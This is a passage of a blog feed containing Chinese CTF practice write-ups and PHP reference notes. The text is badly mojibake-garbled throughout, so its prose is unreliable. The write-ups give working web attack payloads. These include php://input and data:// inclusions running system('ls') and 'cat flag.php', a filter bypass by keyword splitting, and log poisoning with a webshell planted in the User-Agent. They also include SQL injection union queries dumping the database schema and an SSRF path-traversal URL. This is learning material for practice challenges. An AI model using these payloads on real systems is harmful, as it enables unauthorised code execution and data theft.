color="DarkSeaGreen"><i>ä¼ªåè®®äºŒ</i></font></h1>ç¬¬äºŒé¢˜å¤šäº†ä¸€ä¸ªstr_replace(str_replace() å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚)è¿˜æœ‰åœ¨æ­£åˆ™åŒ¹é…é‚£å¤šäº†ä¸ª/iï¼Œè¿™ä¸ªä¸œè¥¿æ˜¯è®©æ­£åˆ™åŒ¹é…å°±æ˜¯ä¸ç”¨ç®¡å¤§å°å†™ï¼Œæ‰€ä»¥ç¬¬ä¸€é¢˜çš„åšæ³•å°±ä¸å¯ä»¥äº†.ä½†æ˜¯é€šè¿‡å­¦ä¹ è¿™ä¸ªstr_replaceçš„ä½œç”¨æˆ‘ä»¬å¯ä»¥å°è¯•å»è¯´æŠŠphpæ„é€ æˆptroyehp,æŠŠbaseæ•´æˆbtroyeaseã€‚å› ä¸ºstr_replaceè¿™ä¸ªå‡½æ•°åœ¨è¿™é‡Œçš„ä½œç”¨å°±æ˜¯æŠŠè¿™ä¸ªtroyeæ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸçš„ç»•è¿‡äº†ï¼Œå¾—åˆ°äº†base64ç¼–ç <p><img src="3.png" alt="3"></p><h1><font color="DarkSeaGreen"><i>ssrf1</i></font></h1>ä»£ç å¾ˆç®€å•ï¼Œå‚æ•°ä¸­è¦æœ‰unctf.com,è€Œä¸”è¿‡æ»¤äº†è®¸å¤šä¼ªåè®®ï¼Œç„¶åé¢˜ç›®ä¸Šåˆè¯´â€˜å•Šè¿™ï¼Œè¿™æ€ä¹ˆ...è¿™file_get_contents()æœ‰å•¥ç”¨å‘¢â€™ï¼ŒæŸ¥æ‰¾èµ„æ–™å½“PHPçš„ file_get_contents() å‡½æ•°åœ¨é‡åˆ°ä¸è®¤è¯†çš„ä¼ªåè®®å¤´æ—¶å€™ä¼šå°†ä¼ªåè®®å¤´å½“åšæ–‡ä»¶å¤¹ï¼Œé€ æˆç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè¿™æ—¶å€™åªéœ€ä¸æ–­å¾€ä¸Šè·³è½¬ç›®å½•å³å¯è¯»åˆ°æ ¹ç›®å½•çš„æ–‡ä»¶ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥åœ¨SSRFçš„ä¼—å¤šåè®®è¢«bançš„æƒ…å†µä¸‹æ¥è¿›è¡Œè¯»å–æ–‡ä»¶<p>æ‰€ä»¥æ„é€ ï¼Ÿurl=luckyï¼š//lucky/dotnet.comï¼š//../../../../../flag,å¾—åˆ°flag</p><p><img src="2.png" alt="2"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå‘¨å­¦ä¹ æŠ¥å‘Š</title>
      <link href="/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><h1><font color="DarkSeaGreen"><em>ä¼ªåè®®</em></font></h1>è§å¦ä¸€ç¯‡åšå®¢ï¼Œä¼ªåè®®<h1><font color="DarkSeaGreen"><em>æ—¥å¿—æ–‡ä»¶åŒ…å«getshell</em></font></h1>è§å¦ä¸€ç¯‡åšå®¢ï¼Œæ¼æ´ç§¯ç´¯ã€‚<h1><font color="DarkSeaGreen"><em>ä¸€å‘¨åˆ·é¢˜è®°å½•</em></font></h1>åšçš„éƒ½æ˜¯ä¸€äº›æ¯”è¾ƒåŸºç¡€çš„æ²¡æœ‰éš¾åº¦çš„é¢˜ç›®ã€‚<br>ç¬¬ä¸€ä¸ªç±»å‹,æ–‡ä»¶æ”¶é›†<ul><li>ç¬¬ä¸€é¢˜<br>web1:where is flag?<br>å¾ˆç®€å•çš„ç­¾åˆ°é¢˜ï¼Œç›´æ¥ctrl+uæŸ¥çœ‹æºä»£ç å¾—åˆ°flag<li>ç¬¬äºŒé¢˜<br>é¢˜ç›®æ‰“å¼€æœ‰ä¸€è¡Œä¿¡æ¯æ˜¯è¯´æ— æ³•æŸ¥çœ‹æºä»£ç ï¼Œç¡®å®shift+f12æ²¡æœ‰ä½œç”¨ï¼Œä¸€ä¸‹æœ‰å‡ ç§åšæ³•ã€‚<br>1.ctrl+u<br>2.åœ¨urlå‰é¢åŠ show resourceï¼šæŸ¥çœ‹æºä»£ç <br>3.ç«ç‹æµè§ˆå™¨èœå•å¤„æœ‰ä¸ªwebå¼€å‘è€…ç‚¹å‡»æŸ¥çœ‹æºä»£ç <br><li>ç¬¬ä¸‰é¢˜æ‰“å¼€ä¾æ—§æ˜¯web3:where is flag?<br>æ­¤æ—¶æŸ¥çœ‹æºä»£ç æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œçªç„¶æƒ³åˆ°æ²¡æ€è·¯å°±æŠ“ä¸ªåŒ…ï¼Œæœç„¶ï¼ŒGOåå¾—åˆ°flag<li>ç¬¬å››é¢˜<br>æ‰“å¼€è¿˜æ˜¯web5:where is flag ?<BR>å®³ï¼Œçœ‹view hintè¯´æ˜¯è·Ÿphpsæºç æ³„éœ²æœ‰å…³<br>phpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰ç›´æ¥é€šè¿‡webæµè§ˆå™¨æŸ¥çœ‹phpä»£ç çš„å†…å®¹ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡webæµè§ˆå™¨â€œçœ‹åˆ°â€phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚<br>æ‰€ä»¥ç›´æ¥åœ¨urlåé¢æ·»åŠ index.phpså¼¹å‡ºæ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€å¾—åˆ°flagã€‚<br>ç¬¬äºŒä¸ªç±»å‹ï¼Œæ–‡ä»¶åŒ…å«<li>ç¬¬ä¸€é¢˜<br>if(isset($_GET['file'])){<br>    $file = $_GET['file'];<br>    $file = str_replace("php", "???", $file);<br>    include($file);<br>}else{<br>    highlight_file(__FILE__);<br>}<br>å› ä¸ºæš‚æ—¶ä¸çŸ¥é“å‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œä¼ ä¸ä¸Šå›¾ç‰‡ï¼Œå°±ç›´æ¥æŠŠæºç é™„ä¸Šäº†<br>è¿™é‡Œå°±æ˜¯æ–‡ä»¶$fileçš„phpéƒ½é…æ›¿æ¢æˆäº†ï¼Ÿï¼Ÿï¼Ÿ<br>æ‰€ä»¥è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•<br>1.å¤§å†™phpï¼ŒPHP://input[POST DATA]ä¸º<ï¼Ÿphp system ("ls");ï¼Ÿ><br>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶åï¼Œå¾—åˆ°flag.php<br>ç„¶å[post data]ä¸º<?php system ("cat flag.php");?>æˆ–è€…æ˜¯<ï¼Ÿphp system("cat flag,php|base.64");ï¼Ÿ><br>2.data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOw==(<?php system("ls");)<br>ç„¶ådata://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZyIpOw==(<?php system("cat flag.php");)<li>ç¬¬äºŒé¢˜<br>if(isset($_GET['file'])){<br>    $file = $_GET['file'];<br>    $file = str_replace("php", "???", $file);<br>    $file = str_replace("data", "???", $file);<br>    include($file);<br>}else{<br>    highlight_file(__FILE__);<br>}<br>è¿™é“é¢˜è·Ÿä¸Šä¸€é“é¢˜ä¸ä¸€æ ·çš„æ˜¯è¿™ä¸ªdataä¹Ÿä¸èƒ½ç”¨äº†ï¼Œæˆ‘æ˜¯åˆæƒ³è¯´å¤§å°å†™ä¸€ä¸‹PHPï¼š//filteræˆ–è€…DATA://textè¿™æ ·çš„ä½†æ˜¯éƒ½æ²¡æœ‰æˆåŠŸï¼Œå°±æ˜¯ç”¨å“ªä¸ªPHPï¼š//inputè¿™ä¸ªæˆåŠŸäº†<br><li>ç¬¬ä¸‰é¢˜<br>if(isset($_GET['file'])){<br>    $file = $_GET['file'];<br>    $file = str_replace("php", "???", $file);<br>    $file = str_replace("data", "???", $file);<br>    $file = str_replace(":", "???", $file);<br>    include($file);<br>}else{<br>    highlight_file(__FILE__);<br>}<br>è¿™ä¸ªä¸å¥½åšçš„ä¸€ç‚¹æ˜¯è¯´å®ƒè¿ï¼šéƒ½ä¸èƒ½ç”¨äº†ï¼Œçœ‹äº†view hintæ˜¯ç»™äº†ä¸ªæç¤ºæ˜¯æ–‡ä»¶åŒ…å«getshellæ¼æ´ï¼Œå…·ä½“æ¼æ´æ˜¯æ€æ ·çš„æˆ‘æœ‰åœ¨ä¸€ä¸ªåšå®¢ä¸­å†™é“ï¼Œç»™äº†ä¸€ä¸ªåŒ…å«æ—¥å¿—æ–‡ä»¶ è¿›è¡Œgetshell æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š ?file=/var/log/nginx/access.log<br>å› ä¸ºä¸åŒçš„ç³»ç»Ÿçš„é‡ç”¨çš„æ–‡ä»¶è·¯å¾„æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥å°±åœ¨bpçš„userâ€”agentä¸­åŠ äº†ä¸ªæœ¨é©¬ï¼Œè¿ä¸Šèšå‰‘å¾—åˆ°flagã€‚</li>ç¬¬ä¸‰ä¸ªç±»å‹sqlæ³¨å…¥é¢˜ç›®æ‰“å¼€åå‡ºæ¥çš„ç•Œé¢æ˜¯å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„å¡«å†™ç”¨æˆ·åå’Œå¯†ç ï¼Œéšä¾¿è¾“å…¥çš„æ˜¯æ²¡æœ‰æŠ¥é”™åªæ˜¯æ¸…ç©ºäº†ç•Œé¢ï¼Œemmmè¿™é‡Œäº†è§£ä¸‹ä¸‡èƒ½å¯†ç ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯'or 1=1 #,ä¹Ÿå°±æ˜¯lucky'or 1=1 #,å› ä¸ºé‚£ä¸ª#å·æ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥è¯­å¥åé¢æ˜¯è¢«æ³¨é‡Šæ‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯†ç æ˜¯å•¥æ— æ‰€ä¸ºäº†<br>ç„¶åå°±å¯ä»¥çœ‹åˆ°è™½ç„¶é‚£ä¸ªç•Œé¢åˆè¢«æ¸…ç©ºäº†ï¼Œä½†æ˜¯ï¼Œå‡ºç°äº†æ¬¢è¿ä½ ï¼Œctfshowã€‚<br>ç„¶åå°±æ˜¯åˆ¤æ–­å­—æ®µï¼Œçˆ†åº“ï¼Œçˆ†è¡¨ï¼Œçˆ†å­—æ®µ<br>åœ¨bpé‚£è¾“å…¥union select 1,2,3çŸ¥é“è¾“å…¥åˆ°ä¸‰çš„æ—¶å€™å‡ºç°äº†ctfshowæ¬¢è¿ä½ é‚£å‡ºç°äº†æ¬¢è¿ä½ ï¼Œè¯´æ˜æœ‰ä¸‰ä¸ªå­—æ®µ<br>ç„¶åçˆ†åº“ï¼Œunion select 1ï¼Œdatabaseï¼ˆï¼‰ï¼Œ3æ‰¾åˆ°åº“å<BR>çˆ†è¡¨union select 1,group_concat(table name),3 from information_schema.tables where table_schema="web 2"(åº“å)<br>çˆ†å­—æ®µ union select 1,group_concat(columu_name),3 from information_schema.columans where table_name="flag"<br>çˆ†å€¼union select 1,flag,3 from flagå¾—åˆ°flag<h1><font color="DarkSeaGreen"><em>ssrfæ¼æ´</em></font></h1>ssrfï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªæ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œssrfæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚<br><ul><li>å¯ä»¥å¯¹å¤–ç½‘ï¼ŒæœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯.</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘ã€æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰<li>å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°ã€‚<li>æ”»å‡»å†…å¤–ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨getå‚æ•°å°±å¯ä»¥å®ç°æ”»å‡»ã€‚<li>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ã€‚]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpå‡½æ•°</title>
      <link href="/2020/12/02/php%E5%87%BD%E6%95%B0/"/>
      <url>/2020/12/02/php%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æ— </p><span id="more"></span><h1><li>str_replace</h1>  æ›¿æ¢å­—ç¬¦ä¸²çš„ä¸€äº›å­—ç¬¦(åŒºåˆ†å¤§å°å†™)<br>  å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚å¯¹æ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚å¦‚æœåŒæ—¶å¯¹æŸä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œçš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™çš„å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†æ˜¯æ”¯é˜Ÿä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿æ¢çš„å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ã€‚<BR>  <em>è¯­æ³•</em>  str_replace(find,replace,string,count)  <table border="1">  <tr>    <th>å‚æ•°</th>    <th>æè¿°</th>  </tr>  <td>find</td>  <td>å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼</td>  </tr>   <tr>  <td>replace</td>  <td>å¿…éœ€ï¼Œè§„å®šæ›¿æ¢findçš„å€¼</td>  </tr>  <tr>  <td>string</td>  <td>å¿…éœ€è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²</td>  </tr>  <tr>  <td>count</td>  <td>å¯é€‰ï¼Œä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°</td>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¼ªåè®®</title>
      <link href="/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>ä¼ªåè®®çš„å­¦ä¹ </p><span id="more"></span><p><font color="DarkSeaGreen">ä¼ªåè®®çš„å­¦ä¹ </font></p><p>phpä¼ªåè®®å¸¸ç”¨äºæ–‡ä»¶åŒ…å«æ¼æ´ä¸­ï¼Œåœ¨phpä¸­èƒ½è¿›è¡Œæ–‡ä»¶åŒ…å«çš„å‡½æ•°æœ‰ï¼Œincludeï¼ˆï¼‰ï¼Œrequireï¼ˆï¼‰ï¼Œrequire_onceï¼ˆï¼‰ï¼Œinclude_onceï¼ˆï¼‰ï¼Œhighlight_fileï¼ˆï¼‰ï¼Œshow_sourceï¼ˆï¼‰ï¼Œfile_get_contentsï¼ˆï¼‰ï¼Œfileï¼ˆï¼‰ç­‰</p><h1>includeå‡½æ•°</h1><br>    å¯ä»¥æ”¾åœ¨phpè„šæœ¬çš„ä»»æ„éƒ¨ä½ï¼Œä¸€èˆ¬æ”¾åœ¨æµç¨‹æµç¨‹æ§åˆ¶çš„å¤„ç†éƒ¨åˆ†ä¸­ã€‚å½“phpæ‰§è¡Œåˆ°includeæŒ‡å®šå¼•å…¥çš„æ–‡ä»¶æ—¶ï¼Œæ‰å°†ä»–åŒ…å«å¹¶å°è¯•æ‰§è¡Œã€‚å½“ç¬¬äºŒæ¬¡é‡åˆ°ç›¸åŒçš„å‡½æ•°æ—¶ï¼Œphpè¿˜æ˜¯ä¼šé‡æ–°è§£é‡Šï¼ŒåŒæ—¶åœ¨å¼•å…¥æ–‡ä»¶åŒ…å«ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½¿ï¼Œphpåœ¨è§£é‡Šçš„è¿‡ç¨‹ä¸­ä¼šå‘ç”Ÿå‡½æ•°é‡æ–°å®šä¹‰çš„é—®é¢˜ã€‚æˆåŠŸè¿”å›1ï¼Œå¤±è´¥è¿”å›false<h1>requireå‡½æ•°</h1>    requireå‡½æ•°ä¸€èˆ¬æ”¾åœ¨phpè„šæœ¬çš„æœ€å‰é¢ï¼Œphpæ‰§è¡Œå‰å°±ä¼šè¯»å…¥requireæŒ‡å®šå¼•å…¥çš„æ–‡ä»¶ï¼ŒåŒ…å«å¹¶å°è¯•æ‰§è¡Œå¼•å…¥çš„è„šæœ¬æ–‡ä»¶ã€‚å½“å®ƒåœ¨ç»Ÿä¸€çš„ç½‘é¡µä¸­è§£é‡Šåï¼Œç¬¬äºŒæ¬¡ä¾¿ä¸ä¼šè§£é‡Šã€‚ä½†åŒæ—¶å› ä¸ºå®ƒä¸ä¼šé‡å¤è§£é‡Šå¼•å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥å½“phpä¸­ä½¿ç”¨å¾ªç¯æˆ–æ¡ä»¶è¯­å¥æ¥å¼•å…¥æ–‡ä»¶æ—¶ï¼Œéœ€è¦ç”¨åˆ°includeã€‚æˆåŠŸè½½å…¥1ï¼Œå¤±è´¥æ— è¿”å›å€¼ã€‚<h1>include_onceå’Œrequire_onceå‡½æ•°</h1>    åˆ†åˆ«ä¸includeä¸requireçš„ä½œç”¨ç›¸åŒï¼Œä¸åŒçš„æ˜¯ä»–ä»¬åœ¨æ‰§è¡Œåˆ°æ—¶ä¼šå…ˆæ£€æŸ¥ç›®æ ‡å†…å®¹æ˜¯ä¸æ˜¯åœ¨ä¹‹å‰å·²ç»å¯¼å…¥è¿‡ï¼Œå¦‚æœæ˜¯é‚£ä¾¿ä¸ä¼šå†æ¬¡é‡å¤å¼•ç”¨å…¶åŒæ ·çš„å†…å®¹ã€‚<h1>highlight_fileå‡½æ•°</h1>    å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•çš„é«˜äº®æ˜¾ç¤º<br>    è¯­æ³•ï¼šhighlight_file(filenameï¼Œreturn)â€”â€”filenameï¼šå¿…éœ€ã€‚è¦è¿›è¡Œé«˜äº®å¤„ç†çš„phpæ–‡ä»¶è·¯å¾„ã€‚returnï¼šå¯é€‰ã€‚å¦‚æœè®¾ç½®trueï¼Œåˆ™æœ¬å‡½æ•°è¿”å›é«˜äº®å¤„ç†çš„ä»£ç ã€‚<br>    è¯¥å‡½æ•°é€šè¿‡ä½¿ç”¨phpè¯­æ³•é«˜äº®ç¨‹åºä¸­å®šä¹‰çš„é¢œè‰²ï¼Œè¾“å‡ºæˆ–è¿”å›åŒ…å«åœ¨filenameä¸­ä»£ç çš„è¯­æ³•é«˜äº®ç‰ˆæœ¬ã€‚å¦‚æœreturnå‚æ•°è¢«è®¾ç½®ä¸ºtrueï¼Œé‚£ä¹ˆè¯¥å‡½æ•°ä¼šè¿”å›è¢«é«˜äº®å¤„ç†çš„ä»£ç ï¼Œè€Œä¸æ˜¯è¾“å‡ºä»–ä»¬ï¼Œå¦åˆ™ï¼Œè‹¥æˆåŠŸï¼Œåˆ™è¿”å›trueï¼Œå¤±è´¥åˆ™è¿”å›falseã€‚è®¸å¤šæœåŠ¡å™¨è¢«é…ç½®ä¸ºå¯¹å¸¦æœ‰phpsåç¼€çš„æ–‡ä»¶è¿›è¡Œè‡ªåŠ¨é«˜äº®å¤„ç†ã€‚<h1>show_sourceå‡½æ•°</h1>    æ˜¯highlight_fileå‡½æ•°çš„åˆ«åã€‚<h1>file_get_contentså‡½æ•°</h1>    æŠŠæ•´ä¸ªæ–‡ä»¶è¯»åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚æ˜¯é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚<br>    è¯­æ³•ï¼šfile_get_content(path,include_path,context,start,max_length)<br><table border="1">   <tr>       <th>å‚æ•°</th>       <th>æè¿°</th>   </tr>   <tr>       <td>path</td>       <td>å¿…é¡»ã€‚è§„å®šè¦è¯»çš„æ–‡ä»¶</td>   </tr>   <tr>       <td>include_path</td>       <td>å¯é€‰ï¼Œå¦‚æœä¹Ÿæƒ³åœ¨include_pathä¸­è®¾ç½®æ–‡ä»¶çš„è¯ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸º1</td>   </tr>  <tr>       <td>context</td>       <td>å¯é€‰ï¼Œè§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚<br>       contextæ˜¯ä¸€å¥—å¯ä»¥é€‰æ‹©æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨nullï¼Œåˆ™å¿½ç•¥ã€‚</td>  </tr>  <tr>      <td>start</td>      <td>å¯é€‰ã€‚è§„å®šåœ¨æ–‡ä»¶ä¸­å¯ä»¥è¯»å–çš„ä½ç½®ã€‚</td>  </tr>   <tr>max_length</tr>  <tr>å¯é€‰ã€‚è§„å®šè¯»å–çš„å­—èŠ‚æ•°ã€‚</tr></table><h1>fileå‡½æ•°</h1>     æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ã€‚æ•°ç»„ä¸­æ¯ä¸ªå•å…ƒéƒ½æ˜¯æ–‡ä»¶ä¸­ç›¸åº”çš„ä¸€è¡Œï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…ã€‚å¦‚æœå¤±è´¥ï¼Œè¿”å›falseã€‚<br>     è¯­æ³•:fileï¼ˆpathï¼Œinclude_pathï¼Œcontextï¼‰<br>     æ¯ä¸ªå‚æ•°çš„å«ä¹‰åŒä¸Š<h1>fopenå‡½æ•°</h1><h1>readfileå‡½æ•°</h1><p><font color="DarkSeaGreen">ä¼ªåè®®æ€»ç»“</font></p><h1>fileï¼š//åè®®</h1><ul>     <li>æ¡ä»¶ï¼šallow_url_fopen  on/off <br>          allow_url_include on/off </li> <br> <li>ä½œç”¨ï¼šç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼Œåœ¨ctfé€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ä¸”ä¸å—é™åˆ¶ã€‚</li><li>è¯´æ˜ï¼šfileï¼š//æ–‡ä»¶ç³»ç»Ÿæ˜¯phpä½¿ç”¨çš„é»˜è®¤å°è£…åè®®ï¼Œå±•ç°äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼ˆä¸ä»¥/ã€ã€\æˆ–windowsç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ï¼‰æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„æ–‡ä»¶ç›®å½•ã€‚<br><li>ç¤ºä¾‹<br>    fileï¼š//[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]<br>    ï¼Ÿfile=fileï¼š//Eï¼š\phpstudy\www\phpinfo.txt<br>    [æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å]<br>    ï¼Ÿfile=flag<br>    [httpï¼š//ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å]<br>    ?file=http://127.0.0.1/flag</li></ul><h1>php://åè®®</h1><ul>   <li>æ¡ä»¶ï¼š    allow_url_fopenï¼šon/off    allow_url_include:   </li>   <li>ä½œç”¨ï¼š    phpï¼š//è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆi/o streamsï¼‰ï¼Œåœ¨ctfä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯phpï¼š//filterå’Œphpï¼š//inputï¼Œphpï¼š//filterç”¨äºè¯»å–æºç ï¼Œphpï¼š//inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</li>  <li><em>php://filterå‚æ•°è¯¦è§£</em>    è¯¥åè®®çš„å‚æ•°ä¼šåœ¨è¯¥åè®®è·¯å¾„ä¸Šè¿›è¡Œä¼ é€’ï¼Œå¤šä¸ªå‚æ•°éƒ½å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸Šä¼ é€’ã€‚</li><table border="1"><tr>    <th>å‚æ•°</th>    <th>æè¿°</th></tr><tr>    <td>resource=<è¦è¿‡æ»¤çš„æ•°æ®æµ></td>    <td>å¿…é¡»é¡¹ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td></tr><tr>     <td>read=<è¯»é“¾çš„è¿‡æ»¤å™¨></td>     <td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨çš„åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ**ï¼‰åˆ†éš”ã€‚</td></tr><tr>    <td>write=<å†™é“¾çš„è¿‡æ»¤å™¨></td>    <td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨çš„åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ\)åˆ†éš”ã€‚</tr><tr>    <td><;ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨></td>    <td>ä»»ä½•æ²¡æœ‰ä»¥read=å’Œwrite=ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td></tr></table><li> ä¸»è¦çš„è¿‡æ»¤å™¨</li><table border="1"><tr>    <th>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</th>    <th>ä½œç”¨</th></tr><tr>    <td>string.rot13</td>    <td>ç­‰åŒäºstr_rot13ï¼ˆï¼‰ï¼Œrot13å˜æ¢</td><tr>    <td>string.toupper</td>    <td>ç­‰åŒäºstrtoupperï¼ˆï¼‰ï¼Œè½¬å¤§å†™å­—æ¯</td></tr><tr>    <td>string.tolower</td>    <td>ç­‰åŒäºstrtolowerï¼Œè½¬å°å†™å­—æ¯</td></tr><tr>    <td>string.strip_tags</td>    <td>ç­‰åŒäºstrip_tagsï¼ˆï¼‰ï¼Œå»æ‰htmlï¼Œphpè¯­è¨€æ ‡ç­¾ã€‚</td></tr></table><table border="1"><tr>    <th>è½¬æ¢è¿‡æ»¤å™¨</th>    <th>ä½œç”¨</th></tr><tr>    <td>convert.base64-encode/convert.base64-decode</td>    <td>base64çš„ç¼–ç è§£ç </td></tr><tr>    <td>convert.quoted-printable-encode/convert.quoted-printable-decode quoted-printable</td>    <td>å­—ç¬¦ä¸²ä¸8-bitå­—ç¬¦ä¸²çš„ç¼–ç è§£ç ã€‚</td></tr></table><table border="1"><tr>    <th>å‹ç¼©è¿‡æ»¤å™¨</th>    <th>ä½œç”¨</th></tr><tr>    <td>zlib.deflate zlib.inflate</td>    <td>åœ¨æœ¬åœ°ç³»ç»Ÿä¸­åˆ›å»ºgzipå…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©ä¸è§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†</td></tr><tr>    <td>bzip2.compress bzip.decompress</td>    